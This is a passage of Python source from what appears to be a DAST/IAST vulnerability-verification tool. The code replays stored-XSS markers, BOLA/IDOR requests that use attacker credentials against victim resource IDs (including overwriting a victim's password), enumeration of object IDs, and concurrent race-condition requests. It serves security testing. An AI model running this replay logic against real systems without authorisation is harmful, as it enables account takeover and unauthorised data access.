        from src.iast.attack_context import guard_http_request
        _g = guard_http_request(method, url, params=query, json_body=body)
        if _g.get("blocked"):
            # 出站硬闸门（item 一）：命中进程生命周期/自毁端点，绝不投放。返回 error 型 DastImpact
            # → 调用方按"无证据"处理（不会误判 confirmed），同时避免把靶场自身重启/终止、
            _note = _g.get("note") or {}
            logger.warning("[destructive-guard] _send_one 拒绝投放（%s）：%s %s",
                           _note.get("category"), method, url)
            return DastImpact(error="blocked_by_destructive_guard: %s" % _note.get("reason", ""),
                              retried=0, provisional=True)
        query = _g["params"] if isinstance(_g.get("params"), dict) else query
        body = _g["json_body"]
        # M13 DAST 浏览器扩展要按需起 headless 浏览器取证，必须知道**真实发出的那个 URL**
        # （重定向/鉴权跳转都会改地址，用 spec 里的原始 endpoint 拼出来的地址浏览器根本打不开）。
        # 用 requests 的 prepare 离线拼最终 URL（零 I/O），供 D2 的 browser_dom 通道复用。
        try:
            _prep_body = body if "form" in str(content_type or "").lower() else None
            _prepared = requests.Request(
                method=str(method or "GET").upper(), url=str(url), params=query or None,
                headers=headers or None, cookies=cookies or None, data=_prep_body,
            ).prepare()
            _replay_url = str(_prepared.url or url)
        except Exception:
            _replay_url = str(url)
        # 背景：sqli 三族召回 55~75%，漏报全是 unconfirmed/no-arrival；且「参数名完全匹配」
        # 说明丢失点在更底层（编码/双投/转义/doGet→doPost 转发），靠读代码猜不出来——
        # 故提供确定性观测：开 SAST_AI_D1_DUMP_REQ=1 后，每次出站请求落一行 JSONL，
        # 可直接看到 method/最终URL/headers/body 与 query 的真实形态。
        # 默认关闭（零开销），仅定位期开启。
        _dump_outbound(method, url, _replay_url, query, headers, cookies, body,
                       content_type, files)
        response = None
        retried = 0
        last_err = ""
        _auth_state = "anonymous"
        for attempt in range(3):
            try:
                _data, _json = body_data_json(body, content_type)
                if files:
                    _data, _json = (dict(files) if isinstance(body, dict) else None), None
                resp, _auth_state = self._guarded_request(
                    method=method, url=url, params=query or None, headers=headers or None,
                    cookies=cookies,
                    data=_data,
                    json_body=_json,
                    files=files or None,
                    timeout=10, allow_redirects=False,
                )
                if 500 <= int(resp.status_code) < 600:
                    last_err = f"transient 5xx: {resp.status_code}"
                    resp = None
                else:
                    response = resp
                    last_err = ""
                    break
            except Exception as exc:  # noqa: BLE001
                last_err = str(exc)
                resp = None
            if resp is None and attempt < 2:
                retried += 1
                time.sleep(0.5 * (2 ** attempt))
        if response is None:
            return DastImpact(error=last_err or "dast replay failed", retried=retried,
                              provisional=True, replay_url=_replay_url,
                              auth_state=_auth_state)
        text = response.text or ""
        try:
            _resp_headers = dict(getattr(response, "headers", None) or {})
        except Exception:
            _resp_headers = {}
        _impact = DastImpact(
            reached=True, status_code=response.status_code, body=text[:2000],
            # M13：真实发出的 URL（prepare 后含 query），供 D2 按需起 headless 浏览器还原同一页面
            replay_url=_replay_url,
            response_summary=f"status={response.status_code}; body={text[:300]}",
            headers=_resp_headers,
            retried=retried, provisional=False,
            # 缺口三：WAF/拦截器/参数截断 信号透传（保守检测，正常 200 不命中）。
            waf_blocked=self._is_waf_blocked(response.status_code, text, _resp_headers),
            auth_state=_auth_state,
        )
        return _impact

    # ── M7 两步重放（存储型写→读配对）────────────────────────────────────────
    def _two_step_enabled(self, spec: Optional[Dict[str, Any]]) -> bool:
        """本条 spec 是否值得跑两步重放。

        判据：spec 或 raw_json 里配了写端点（write_endpoint / replay_plan），
        或写端点存在且族属存储型信号（stored / xss）。没配就别发请求——
        两步重放固有 2 次开销，对反射型是纯浪费。
        """
        try:
            from src.core.replay_plan import plan_from_spec
        except Exception:
            return False
        spec = spec or {}
        plan = plan_from_spec(spec) or {}
        if plan.get("read_endpoint") or plan.get("steps"):
            return bool(plan.get("enabled", True))
        w_ep = (spec.get("write_endpoint") or "") or ""
        if w_ep:
            return True
        fam = str(spec.get("family") or "").lower()
        return "stored" in fam or fam in ("xss", "ssti", "template")

    def _replay_two_step(self, spec: Dict[str, Any], target: Dict[str, Any],
                         auth_context: Optional[Dict[str, Any]] = None,
                         accounts: Any = None) -> Dict[str, Any]:
        """两步重放：第一步把自限标记写进存储，第二步在**另一次请求**的响应里把它读回来。

        为什么必须两步、插桩为什么帮不上（模块头已详述）：canary 注在请求参数里，
        传播范围限于请求内；存储型读取侧的参数里根本没有 canary，探针无污点可跟。
        所以读取侧只认**回显比对**——搜我们投进去的那个 UUID 字符串。

          一级 static —— replay_plan.read_endpoint（A1 静态给，绝大多数走这条，零额外请求）
          二级 llm     —— 静态给不出时由 gateway 读代码补候选（慢但准，只在缺静态时走）
          三级 probe_scan —— 标记反查：GET 端点候选挨个扫（兜底，且保留一个用途：
                            静态给的读端点也要用 UUID 验一次「确实是从这读出来的」）
        预算纪律：本方法在预算内最多再花 2 次请求（写 1 + 读 1）。主重放端点本身就是
        写端点时跳过写步（省 1 次），两步重放不会把 5 次预算吃穿。

        返回 two_step 证据字典（不落表，喂 DastImpact.two_step → D2 echo_marker 通道）。
        """
        from src.core.replay_plan import (
            build_replay_plan, plan_from_spec, classify_echo,
            make_self_limiting_marker,
        )

        out: Dict[str, Any] = {
            "enabled": False, "plan": {}, "marker": "", "steps_executed": 0,
            "write_skipped": False, "write": {}, "read": {},
            "read_endpoint_source": "none",
        }

        base_url = str((target or {}).get("service_url") or "").rstrip("/")
        auth = auth_context if isinstance(auth_context, dict) else (
            (target or {}).get("auth_context") or (spec or {}).get("auth_context") or {})
        if not isinstance(auth, dict):
            auth = {}
        headers = dict(auth.get("auth_headers") or {})
        cookies = dict(auth.get("auth_cookies") or {})
        self._accounts = accounts if accounts is not None else (target or {}).get("accounts")

        plan = plan_from_spec(spec) or {}
        spec_endpoint = str(spec.get("target_endpoint") or "").strip().lstrip("/")
        spec_method = str(spec.get("http_method") or "GET").upper()
        # 静态一级：replay_plan 自己带读端点
        read_ep = str(plan.get("read_endpoint") or "")
        read_src = str((plan.get("read_endpoint") or {}).get("source") or "static") if isinstance(plan.get("read_endpoint"), dict) else "static"
        if not read_ep:
            # 退化：spec 顶层只带了写端点 → 现造一个 plan，读端点靠二级/三级补
            w_ep = str(plan.get("steps") and (plan["steps"][0] or {}).get("endpoint") or "")
            plan = build_replay_plan(
                w_ep or spec_endpoint, spec_method,
                str(plan.get("stored_field") or spec.get("vulnerable_param") or ""),
                read_endpoint="", read_source="none",
                marker=plan.get("marker") or make_self_limiting_marker(),
            )
        out["plan"] = plan

        spec_marker = str(plan.get("marker") or "")
        if not spec_marker:
            plan["marker"] = make_self_limiting_marker()
            spec_marker = str(plan["marker"])
        out["marker"] = spec_marker

        # 写端点就是主重放端点吗？是的话主重放已经当写用，不重复发（省 1 次预算）
        w_route = ""
        w_method = "POST"
        for st in (plan.get("steps") or []):
            if str(st.get("role")) == "write":
                w_route = str(st.get("endpoint") or "").strip().lstrip("/")
                if st.get("method"):
                    w_method = str(st.get("method")).upper()
                break
        write_owner_same = (w_route and w_route == spec_endpoint and spec_method in
                            ("POST", "PUT", "PATCH"))
        if w_route and not write_owner_same:
            # 补发一次写请求：把自限标记投进存储字段
            _w = self._send_one(
                w_method, urljoin(base_url + "/", w_route) if base_url else "/" + w_route,
                {}, dict(headers), dict(cookies),
                {str(plan.get("stored_field") or spec.get("vulnerable_param") or ""): spec_marker},
                "application/x-www-form-urlencoded")
            out["write"] = {
                "status_code": _w.status_code if _w else None,
                "error": _w.error if _w else "no_response",
                "endpoint": w_route,
            }
            out["steps_executed"] += 1
        else:
            out["write_skipped"] = True
            out["write"] = {"status_code": None, "error": "", "endpoint": w_route,
                            "note": "主重放即写端点，不重复投发"}

        # ── 读端点三级 ──
        if read_ep:
            _r = self._send_one("GET", _join_url(base_url, read_ep),
                                {}, dict(headers), dict(cookies), None, "")
            out["read"] = {
                "endpoint": read_ep, "status_code": _r.status_code if _r else None,
                "state": classify_echo(_r.body if _r else "", spec_marker),
                "source": read_src,
            }
            out["steps_executed"] += 1
            # 静态给的读端点也要用 UUID 验一次（评审保留的用途）：
            # 静态说 /comments 渲染这个字段，实际响应里没有 → 静态判错了，
            # 再花 1 次走标记反查找真读端点。
            if out["read"].get("state") == "absent" and out["steps_executed"] < 2:
                _scan = self._marker_probe_scan(spec, target, auth, spec_marker)
                if _scan.get("endpoint"):
                    out["read"] = _scan
        else:
            # 静态 + LLM 都没给 → 直接三级
            _scan = self._marker_probe_scan(spec, target, auth, spec_marker)
            out["read"] = _scan
            out["steps_executed"] += 1
            out["plan"]["read_endpoint"] = {
                "endpoint": _scan.get("endpoint") or "",
                "source": _scan.get("source") or "none",
            }
        out["enabled"] = True
        out["read_endpoint_source"] = str(out["read"].get("source") or "none")
        logger.info("[D1.replay] 两步重放 %s（marker=%s, read=%s state=%s, source=%s, steps=%d)",
                    spec_endpoint, spec_marker, out["read"].get("endpoint") or "-",
                    out["read"].get("state"), out["read_endpoint_source"], out["steps_executed"])
        return out

    def _marker_probe_scan(self, spec: Dict[str, Any], target: Dict[str, Any],
                           auth: Optional[Dict[str, Any]], marker: str) -> Dict[str, Any]:
        """三级兜底：标记反查 —— 挨个请求 GET 候选，看哪个响应里出现了这个 UUID。

        候选来源（都不需要新基础设施）：
          1) workspace runtime 的 endpoints 配置（workspace_runtime.endpoints_override）；
          2) 写路由的同路径/兄弟路径变体（/comment → /、/comments）。
        limit 硬上限 12，宁可少报也不烧预算。
        """
        from src.core.replay_plan import scan_read_candidates

        base_url = str((target or {}).get("service_url") or "").rstrip("/")
        headers = dict((auth or {}).get("auth_headers") or {})
        cookies = dict((auth or {}).get("auth_cookies") or {})
        spec_endpoint = str(spec.get("target_endpoint") or "").strip().lstrip("/")

        cands: List[str] = []
        try:
            from src.core import workspace_runtime as _wr
            eps = _wr.endpoints_override() or {}
            if isinstance(eps, dict):
                for k, v in eps.items():
                    if str(v or "").lower() in ("get", "*") or str(k).lower().startswith("get"):
                        cands.append(str(k).strip().lstrip("/"))
        except Exception:
            pass
        # 同路径变体：/comment → /comments、/comment/{id} 取首段
        if spec_endpoint:
            cands.append(spec_endpoint)
            cands.append(spec_endpoint + "s")
            head = spec_endpoint.split("//")[0]
            if "/" in head:
                cands.append(head.rsplit("/", 1)[0])

        seen: Set[str] = set()
        uniq = [c for c in cands if c and not (c in seen or seen.add(c))]

        def _fetch(route: str):
            imp = self._send_one("GET",
                                 _join_url(base_url, route),
                                 {}, dict(headers), dict(cookies), None, "")
            return (imp.status_code if imp else None, imp.body if imp else "")

        return scan_read_candidates(uniq, marker, _fetch, limit=12)

    def replay_bola(self, trigger_spec: Dict[str, Any], target: Dict[str, Any],
                    accounts: Any = None) -> Dict[str, Any]:
        """ BOLA 多身份重放：以攻击者(A)身份请求受害者(B)的资源 id，检查是否越权取回 B 的数据。

        trigger_spec 字段：target_endpoint / http_method / param_name(资源 id 参数) /
        param_location / victim_resource_id(B 的资源 id) / victim_identifiers(命中即证明泄露 B 的数据，
        如 B 的 user_id / email / owner 字段值)。
        accounts：{attacker: {auth_headers,auth_cookies}, victim: {...}} 或 attacker 在前的列表。
        """
        spec = dict(trigger_spec or {})
        target = dict(target or {})
        # 统一受害者资源 id 字段名：victim_resource_id（不把 DAST 表的 resource_id 当受害者 id 兜底）。
        victim_id = str(spec.get("victim_resource_id") or "").strip()
        param_name = spec.get("param_name") or "id"
        param_loc = str(spec.get("param_location") or "path").lower()
        method = str(spec.get("http_method") or "GET").upper()
        base_url = str(target.get("service_url") or "").rstrip("/")
        endpoint = str(spec.get("target_endpoint") or "").lstrip("/")

        # 替换原内联的 VICTIM_FROM_POOL 解析与枚举逻辑，统一口径避免漂移与重复。
        _vres = self._resolve_victim_identity(target, spec, accounts)
        victim_markers = _vres.get("victim_markers") or []
        victim_id = str(_vres.get("victim_resource_id") or "").strip() or "1"

        attacker = (accounts or {}).get("attacker") if isinstance(accounts, dict) else (
            accounts[0] if accounts else {})
        auth = attacker or target.get("auth_context") or {}
        if not isinstance(auth, dict):
            auth = {}
        headers = dict(auth.get("auth_headers") or {})
        cookies = dict(auth.get("auth_cookies") or {})

        # 任务4 IAST 校验函数 hook：给攻击请求带上 canary 身份段（走 X-SASTAI-Trace 头，不污染业务参数）。
        # 探针扫到该身份段后 hasCanaryIdentity==true，其 AuthzDecisionAdvice 观测到「访问域对象但无
        # 对象级授权决策」会把 canary 回带进 BOLA_SUSPECT 事件 → 形成授权 hook 语义确认。
        canary = str(spec.get("taint_marker") or "")
        if canary:
            from src.iast.attack_context import TRACE_HEADER
            headers[TRACE_HEADER] = canary

        query: Dict[str, str] = {}
        body: Any = None
        path = endpoint

        def _inject(pname: str, ploc: str, pval: str) -> None:
            nonlocal body, path
            ploc = str(ploc or "query").lower()
            if not pname:
                return
            if ploc == "query":
                query[pname] = pval
            elif ploc == "header":
                headers[pname] = pval
            elif ploc == "cookie":
                cookies[pname] = _cookie_safe_value(pval)
            elif ploc in ("body", "form"):
                body = body or {}
                body[pname] = pval
            elif ploc == "path":
                path = path.replace("{" + pname + "}", pval).replace(":" + pname, pval)

        _inject(param_name, param_loc, str(victim_id))
        # 以 "/" 开头的相对 URL 一律按「绝对路径」处理 ⇒ 直接丢弃 base_url 的 context path。
        # 而带前缀的 /benchmark/xss-00/... 是 200 且原样反射。⇒ 重放 100% 打在 404 上，
        # servlet 根本不执行、sink 不触发，arrivals 自然恒 0（事件表里只剩 Tomcat 404 页的
        # Response.setHeader）。同文件 817/850/2368/2385/2455 早已用 .lstrip("/")，仅 spec
        # 驱动的这几处漏了 —— 补齐，与既有写法和 urljoin 语义对齐。
        url = _join_url(base_url, path)

        # A2：可观测副作用差分（攻击前读 victim 状态）—— IDOR 端点多为 redirect/无响应体，
        # 纯 data_leak 腿（victim_identifiers 全空）恒 False，必须靠 before/after 状态差分自证
        # （DAST 原生，不卡探针闸门）。/profile/password 需先把新密码注入攻击请求再读回复登验证。
        # 否则 "/profile/password" in "profile/password" 恒为 False，
        # 越权改密的新密码永远注入不进攻击请求，登录差分恒为「改前=改后」→ #24 永远不确认。
        _ep_l = "/" + endpoint.lower()
        _attacker_uid = str(
            ((accounts.get("attacker") if isinstance(accounts, dict) else (accounts[0] if accounts else {})) or {}).get("user_id")
            or victim_id)
        _new_pwd = None
        _readback = self._idor_readback_plan(spec, victim_id, _attacker_uid)
        if "/profile/password" in _ep_l and _readback:
            _new_pwd = str(spec.get("param_value") or "PwnedBySAST@2026")
            if param_loc == "body":
                body = body or {}
                body["password"] = _new_pwd
            else:
                query["password"] = _new_pwd
            _readback["password"] = _new_pwd
        _before = self._read_victim_state(target, spec, accounts, _readback) if _readback else None

        impact = self._send_one(method, url, query, headers, cookies, body,
                                str(spec.get("content_type") or ""))

        # victim_markers 已由 B 门禁 _resolve_victim_identity 解析（强指纹，仅 username/email）并回填 spec，
        # 此处不再重复派生（避免重复逻辑漂移）。
        body_text = impact.body or ""
        leaked = [m for m in victim_markers if m and str(m) in body_text]
        # 信号①（结果证据）：攻击者身份取回了受害者标识 → 数据泄露已确认。
        data_leak = bool(impact.reached and impact.status_code == 200 and leaked)

        # 信号②（机制证据）：探针 authz hook 观测到「访问域对象但无对象级授权决策」。
        # 这是把 BOLA 从「响应差分」升级为「语义确认」的关键——差分只证结果，hook 证鉴权机制缺失。
        authz = self._confirm_authz_hook(canary, target, finding_id=spec.get("finding_id")) if canary else {
            "authz_hook_confirmed": False, "authz_hook_objects": [], "authz_hook_events": 0}
        hook_confirmed = bool(authz.get("authz_hook_confirmed"))

        # 信号③（可观测副作用差分）：IDOR 端点多为 redirect/无响应体，data_leak 恒 False，
        # 故在攻击后读回 victim 状态与攻击前（_before）做差分；状态发生非自身操作导致的异常变化即确认
        # 。
        side_effect = False
        if _readback is not None and not (data_leak or hook_confirmed):
            _after = self._read_victim_state(target, spec, accounts, _readback)
            side_effect = self._state_differs(_before, _after, victim_id)

        # 证据强度：结果+（机制或副作用）双证=high；单证=medium；均无=low。
        if data_leak and (hook_confirmed or side_effect):
            confidence = "high"
        elif data_leak or hook_confirmed or side_effect:
            confidence = "medium"
        else:
            confidence = "low"
        confirmed = data_leak or hook_confirmed or side_effect
        return {
            "confirmed": confirmed,
            "data_leak_confirmed": data_leak,
            "authz_hook_confirmed": hook_confirmed,
            "authz_hook_objects": authz.get("authz_hook_objects") or [],
            "authz_hook_events": int(authz.get("authz_hook_events") or 0),
            "observed_side_effect": side_effect,
            "side_effect_confirmed": side_effect,
            "business_confirmed": confirmed,
            "confidence": confidence,
            "verdict": "confirmed" if confirmed else ("no_evidence" if not impact.reached else "ambiguous"),
            "leaked_victim_identifiers": leaked,
            "status_code": impact.status_code,
            "response_summary": impact.response_summary,
            "victim_resource_id": str(victim_id),
            "reason": self._bola_reason(data_leak, hook_confirmed, victim_id, authz.get("authz_hook_objects") or [], side_effect=side_effect),
        }

    def _resolve_object_id(self, base_url: str, endpoint: str, headers: Dict[str, str],
                           cookies: Dict[str, str]) -> str:
        """B 门禁 + 修复增强：victim_resource_id 为空且端点需具体 id 时，枚举真实对象 id。

        把攻击端点映射到其集合/列表入口，以对应身份 GET 取首个真实对象 id，使越权重放打到真实资源
        id（带 canary → 探针发射 BOLA_SUSPECT）：
        - /cart/remove → /cart（Thymeleaf HTML，解析 name="id" value="N"）
        - /address/delete、/address/{id} → /address（无列表则逐 id 探测 /address/{n} 首个 ok:true）
        - 其他 path 型 → 去掉 {id}/:id 后的集合端点
        """
        import re as _re
        _coll = endpoint
        _coll = _re.sub(r"/\{[^}]+\}", "", _coll)
        _coll = _re.sub(r"/:id$", "", _coll).rstrip("/")
        _coll = _re.sub(r"/(remove|delete)$", "", _coll).rstrip("/")
        if not _coll:
            return "1"
        from urllib.parse import urljoin
        url = urljoin(base_url + "/", _coll.lstrip("/")) if base_url else ("/" + _coll.lstrip("/"))
        try:
            resp = self._send_one("GET", url, {}, dict(headers), dict(cookies), None, "")
            if resp and resp.status_code == 200 and resp.body:
                try:
                    data = json.loads(resp.body)
                except Exception:
                    data = None
                items = data if isinstance(data, list) else (
                    data.get("data") if isinstance(data, dict) and isinstance(data.get("data"), list) else None
                )
                if isinstance(items, list) and items:
                    first = items[0]
                    if isinstance(first, dict):
                        for _k in ("id", "userId", "user_id", "addressId", "address_id", "uuid",
                                   "resourceId", "resource_id", "orderId", "order_id", "cartItemId"):
                            _v = first.get(_k)
                            if _v is not None and str(_v).strip():
                                return str(_v).strip()
                # HTML（购物车等 Thymeleaf）：解析 <input name="id" value="N">
                _html_ids = _re.findall(r'name="id"\s+value="(\d+)"', resp.body or "")
                if _html_ids:
                    return _html_ids[0]
                _any = _re.findall(r"\b\d{1,12}\b", resp.body or "")
                if _any:
                    return _any[0]
        except Exception as _e:
            logger.warning("[D1.replay_bola] 枚举对象 id 失败（回退 '1'）：%s", _e)
        # /address 无列表端点 → 逐 id 探测首个 ok:true
        if "address" in _coll:
            for _n in range(1, 9):
                try:
                    _r = self._send_one("GET", urljoin(base_url + "/", "address/%d" % _n),
                                        {}, dict(headers), dict(cookies), None, "")
                    if _r and _r.status_code == 200 and '"ok":true' in (_r.body or "").replace(" ", ""):
                        return str(_n)
                except Exception:
                    pass
        return "1"

    def _confirm_authz_hook(self, canary: str, target: Dict[str, Any],
                            finding_id=None, attempts: int = 12, interval: float = 1.0) -> Dict[str, Any]:
        """任务4：按 canary 回捞探针 authz 盲点事件（BOLA_SUSPECT），做授权语义确认。

        探针事件是异步 flush 的，攻击请求返回后事件可能尚未入库，故做有界轮询（命中即停，
        单测用返回非空的桩，不产生 sleep）。窗口从原 3×0.4s 放宽到 12×1.0s，覆盖靶场探针
        批量落盘的延迟，避免 BOLA_SUSPECT 已入库却被漏捞。命中即证明：探针在字节码层观测到
        「域对象被访问但鉴权未做对象级归属校验」——比响应差分更强的机制级证据。命中后把
        correlated_finding_id 回写 iast_events，使游离事件归属到具体 finding。
        """
        events: List[Dict[str, Any]] = []
        try:
            from src.iast.service import IastService
            svc = IastService(self.db)
            app_name = str((target or {}).get("app_name") or "") or None
            agent_id = str((target or {}).get("agent_id") or "") or None
            for i in range(max(1, attempts)):
                events = svc.poll_authz_blindspots(canary, app_name=app_name, agent_id=agent_id)
                if events:
                    break
                if i < attempts - 1:
                    time.sleep(interval)
        except Exception as exc:  # fail-open：hook 确认失败不影响差分结论
            logger.warning("[D1.authz-hook] 授权 hook 语义确认失败（按无机制证据处理）：%s", exc)
            return {"authz_hook_confirmed": False, "authz_hook_objects": [], "authz_hook_events": 0}

        # 命中后归属：把 BOLA_SUSPECT 事件回写 correlated_finding_id（fail-open，不影响确认结论）
        if finding_id is not None and events:
            try:
                ids = [int(e["id"]) for e in events if e.get("id") is not None]
                if ids:
                    ph = ",".join("?" * len(ids))
                    self.db.execute(
                        "UPDATE iast_events SET correlated_finding_id=? WHERE id IN (%s) AND (correlated_finding_id IS NULL OR correlated_finding_id<>?)" % ph,
                        [finding_id] + ids + [finding_id])
            except Exception as _we:
                logger.warning("[D1.authz-hook] 写回 correlated_finding_id 失败（忽略）：%s", _we)

        objects: List[str] = []
        for e in events:
            sv = str(e.get("source_value") or "")
            # payload 形如 "missing object-level authorization: Order:123,User:7 |canary:s4st41..."
            if "authorization:" in sv:
                seg = sv.split("authorization:", 1)[-1].split("|canary", 1)[0].strip()
                objects.extend([o.strip() for o in seg.split(",") if o.strip()])
        # 去重保序
        seen: set = set()
        objects = [o for o in objects if not (o in seen or seen.add(o))]
        return {
            "authz_hook_confirmed": bool(events),
            "authz_hook_objects": objects,
            "authz_hook_events": len(events),
        }

    @staticmethod
    def _bola_reason(data_leak: bool, hook_confirmed: bool, victim_id: Any, objects: List[str],
                    side_effect: bool = False) -> str:
        if data_leak and (hook_confirmed or side_effect):
            return ("攻击者在自身身份下取回了受害者(id=%s)的资源数据，且%s，结果泄露 + %s双重证据"
                    % (victim_id,
                       ("探针授权 hook 确认访问对象 %s 时未执行对象级归属校验" % (objects or "该域对象")) if hook_confirmed else "可观测副作用差分确认资源被越权改动",
                       "鉴权机制缺失" if hook_confirmed else "越权改动"))
        if data_leak:
            return "攻击者在自身身份下取回了受害者(id=%s)的资源数据（响应差分确认结果泄露）" % victim_id
        if side_effect:
            return ("可观测副作用差分确认：攻击前后受害者(id=%s)的资源状态发生非自身操作导致的异常变化，"
                    "证明越权改动已生效（DAST 原生，不依赖探针）" % victim_id)
        if hook_confirmed:
            return ("探针授权 hook 确认：访问域对象 %s 时未执行任何对象级归属校验（鉴权机制缺失），"
                    "即使本次未从响应中提取到受害者标识，越权访问已被字节码层语义证实" % (objects or "该域对象"))
        return "未观测到受害者标识泄露，且探针未报告授权盲点（或无响应）"

    def replay_race(self, trigger_spec: Dict[str, Any], target: Dict[str, Any],
                    concurrency: int = 5, accounts: Any = None) -> Dict[str, Any]:
        """ RACE 第二信号 + 设计二②副作用确认：双账户差分 + before/after 可观测状态快照。

        设计二②核心：在原有「并发成功数」弱信号之上，新增
        (1) 双账户：用 attacker 账户带登录态并发打敏感端点（无登录态会 401 永远 success=0）；
        (2) 副作用快照：race 前后对受害者/攻击者自身可观测状态（余额/订单数/库存/积分）做 before-after
            差分，出现非自身操作导致的异常变化即 side_effect_confirmed；
        (3) business_confirmed = side_effect_confirmed OR（single_use 且并发成功数>1）。

        无登录态配置 / 无 state_query 时 graceful 降级为原并发计数逻辑（race_suspected 仍产出），
        不报错、不伪造数据。
        """
        import threading
        spec = dict(trigger_spec or {})
        target = dict(target or {})
        method = str(spec.get("http_method") or "POST").upper()
        base_url = str(target.get("service_url") or "").rstrip("/")
        endpoint = str(spec.get("target_endpoint") or "").lstrip("/")

        # single_use 多源解析：spec 顶层 / raw_json.exploit_spec / single_use 别名
        single_use = bool(
            spec.get("race_single_use")
            or _dig(spec.get("raw_json"), "exploit_spec", "race_single_use")
            or spec.get("single_use")
        )

        # 双账户：优先 attacker 带登录态打；无则退回 target.auth_context
        attacker = victim = None
        if isinstance(accounts, dict) and ("attacker" in accounts or "victim" in accounts):
            attacker = accounts.get("attacker") or {}
            victim = accounts.get("victim") or {}
        auth = attacker or (accounts if isinstance(accounts, dict) else None) or target.get("auth_context") or {}
        if not isinstance(auth, dict):
            auth = {}
        headers = dict(auth.get("auth_headers") or {})
        cookies = dict(auth.get("auth_cookies") or {})

        query: Dict[str, str] = {}
        body = spec.get("body")
        path = endpoint
        pname = spec.get("param_name")
        if pname:
            ploc = str(spec.get("param_location") or "body").lower()
            pval = spec.get("taint_marker") or spec.get("param_value") or ""
            if ploc == "query":
                query[pname] = pval
            elif ploc == "body":
                body = body or {}
                body[pname] = pval
            elif ploc == "header":
                headers[pname] = pval
            elif ploc == "cookie":
                cookies[pname] = _cookie_safe_value(pval)
            elif ploc == "path":
                path = path.replace("{" + pname + "}", str(pval))
        # P0-4：无 body 且端点命中已知 schema 时注入合法表单字段，避免 400/无响应被误读为鉴权拒绝
        self._apply_endpoint_schema(spec)
        if spec.get("body") is not None:
            body = spec.get("body")
        # 以 "/" 开头的相对 URL 一律按「绝对路径」处理 ⇒ 直接丢弃 base_url 的 context path。
        # 而带前缀的 /benchmark/xss-00/... 是 200 且原样反射。⇒ 重放 100% 打在 404 上，
        # servlet 根本不执行、sink 不触发，arrivals 自然恒 0（事件表里只剩 Tomcat 404 页的
        # Response.setHeader）。同文件 817/850/2368/2385/2455 早已用 .lstrip("/")，仅 spec
        # 驱动的这几处漏了 —— 补齐，与既有写法和 urljoin 语义对齐。
        url = _join_url(base_url, path)
        content_type = str(spec.get("content_type") or "")
        _race_ep = str(spec.get("target_endpoint") or "").lower()
        if any(k in _race_ep for k in ("/seckill", "/coupon/claim", "/wallet/withdraw", "/wallet/transfer")):
            _n = max(1, int(concurrency or 1))
            return self._replay_race_endpoint(spec, target, accounts, method, url, headers, cookies, body, content_type, _n, single_use)

        # 副作用快照：优先 victim 状态，其次 attacker 自身状态（race 常是「自己并发超领」）
        snap_account = victim or attacker or auth
        # M14：state_query 四级解析 + 写端点推导（src.core.state_query 为唯一口径）。
        # 此前三源全空 → 快照恒 None → 业务逻辑族永远 diff 不出 side_effect，
        # 只能退化成「并发双成功」这个弱信号，这才是那批 unconfirmed 的真因。
        from src.core.state_query import resolve_state_query as _resolve_sq
        snap_cfg, snap_src = _resolve_sq(spec, target)
        # derived 时候选验证最多花 2 次请求，算在 5 次重放预算内。
        _sq_budget = _STATE_QUERY_CANDIDATE_BUDGET if snap_src == "derived" else 0
        victim_before = (self._snapshot_observable_state(snap_account, snap_cfg, target, _sq_budget)
                         if (snap_account and snap_cfg) else None)

        results: List[Dict[str, Any]] = []
        lock = threading.Lock()

        def _worker() -> None:
            imp = self._send_one(method, url, dict(query), dict(headers), dict(cookies), body, content_type)
            with lock:
                results.append({"status": imp.status_code, "reached": imp.reached,
                                "body": (imp.body or "")[:200]})

        n = max(1, int(concurrency or 1))
        threads = [threading.Thread(target=_worker) for _ in range(n)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        success = [r for r in results if r["reached"] and r["status"] and 200 <= int(r["status"]) < 300]
        race_suspected = bool(single_use) and len(success) > 1

        # after 快照 + 差分
        victim_after = (self._snapshot_observable_state(snap_account, snap_cfg, target, _sq_budget)
                        if victim_before is not None else None)
        side_effect = self._diff_observable_state(victim_before, victim_after) if (victim_before is not None and victim_after is not None) else None
        side_effect_confirmed = bool(side_effect and side_effect.get("changed"))

        confirmed = side_effect_confirmed or race_suspected
        confirmation_source = (
            "victim-state-delta" if side_effect_confirmed
            else "concurrency-double-success" if race_suspected
            else "none"
        )
        # 可观测副作用：优先 victim 状态差分，否则用并发双成功作为可观测副作用证据
        observed_side_effect = side_effect or ({
            "type": "concurrency-double-success",
            "single_use": bool(single_use),
            "success_count": len(success),
            "concurrency": n,
        } if race_suspected else None)

        if confirmed:
            reason = (
                f"竞态确认（{confirmation_source}）：single_use={bool(single_use)}，"
                f"并发 {n} 请求中 {len(success)} 个成功"
                + (f"；受害者状态差分 {side_effect}" if side_effect_confirmed else "")
            )
        else:
            reason = (
                f"竞态未确认：并发 {n} 请求中 {len(success)} 个成功（single_use={bool(single_use)}），无状态差分证据"
            )

        first = next((r for r in results if r.get("reached") and r.get("status")), None)
        req_state = self._classify_request_state(first.get("status") if first else None, bool(first),
                                                 first.get("headers") if first else None)

        return {
            "category": "race",
            "confirmed": confirmed,
            "business_confirmed": confirmed,
            "confidence": "high" if confirmed else "low",
            "race_suspected": race_suspected,
            "race_single_use": bool(single_use),
            "concurrency": n,
            "success_count": len(success),
            "request_state": req_state,
            "observed_side_effect": observed_side_effect,
            "victim_account_snapshot": {"before": victim_before, "after": victim_after},
            # M14：状态查证的来源必须可审计 —— 对账时要能说清这条差分是配置给的还是推出来的。
            "state_query": snap_cfg,
            "state_query_source": snap_src,
            "results": results,
            "reason": reason,
            "confirmation_source": confirmation_source,
        }

    def _snapshot_observable_state(self, account: Optional[Dict[str, Any]], cfg: Any,
                                   target: Dict[str, Any],
                                   candidate_budget: int = 0) -> Optional[Dict[str, Any]]:
        """对给定账户 GET 其可观测业务状态（余额/订单数/库存/积分），返回结构化快照。

        cfg 由 src.core.state_query 归一（str 或 {endpoint, method, json_paths, text_paths}），
        另外支持 dict 里带 candidates：候选逐个真发 GET，取**第一个 200 且可解析**的。
        预算纪律：candidate_budget > 0 时最多发这么多候选请求（算进 5 次重放预算），
        全部失败 → 返回 None（调用方降级弱信号，不伪造）。

        无 cfg / 请求失败 / 形状不可解析 → None。非 JSON 且**没给 json_paths/text_paths**
        也返回 None：整段正文做差分会被时间戳/token 淹没，那是假确认不是度量。
        """
        if not account or not cfg:
            return None
        from urllib.parse import urljoin as _uj
        from src.core.state_query import state_query_applicable
        from src.core.state_query import extract_state_fields
        base_url = str(target.get("service_url") or "").rstrip("/")
        cfg = cfg if isinstance(cfg, dict) else {"endpoint": str(cfg or "")}
